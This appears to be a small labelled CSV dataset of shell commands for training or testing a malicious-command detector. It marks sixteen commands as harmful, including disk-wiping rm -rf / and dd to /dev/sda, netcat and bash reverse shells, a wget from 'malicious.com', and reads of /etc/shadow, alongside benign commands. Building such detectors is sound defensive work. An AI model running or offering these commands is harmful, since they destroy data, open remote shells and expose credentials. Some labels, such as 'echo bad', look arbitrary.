command,label
echo bad,1.0
rm -rf /,1.0
dd if=/dev/zero of=/dev/sda,1.0
nmap -A 192.168.0.1,1.0
bash -c 'wget http://malicious.com/exploit.sh',1.0
chmod 777 /etc/passwd,1.0
nc -lvp 1234 -e /bin/bash,1.0
openssl enc -aes-256-cbc -k secret -in file.txt -out file.enc,1.0
find / -name '*password*' -exec rm -rf {} \;,1.0
iptables -A INPUT -j ACCEPT,1.0
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1,1.0
python -m http.server 8080,1.0
cat /dev/zero > /dev/sda,1.0
cat /etc/shadow,1.0
scp file.txt root@192.168.0.1:/root,1.0
whoami && sudo su,1.0
ls -ltr,0.0
cat /var/log/syslog,0.0
ping 8.8.8.8,0.0
cd /home/user,0.0
echo 'Welcome to the system!',0.0
mkdir backup,0.0
cp backup.tar.gz /mnt/usb,0.0
chmod 644 /home/user/document.txt,0.0
man grep,0.0
grep 'error' /var/log/messages,0.0
df -h,0.0
sudo apt update && sudo apt upgrade -y,0.0
mv old_name.txt new_name.txt,0.0
scp user@192.168.0.1:/file .,0.0
git pull origin main,0.0
rsync -av /home/user/docs /backup,0.0
uname -a,0.0
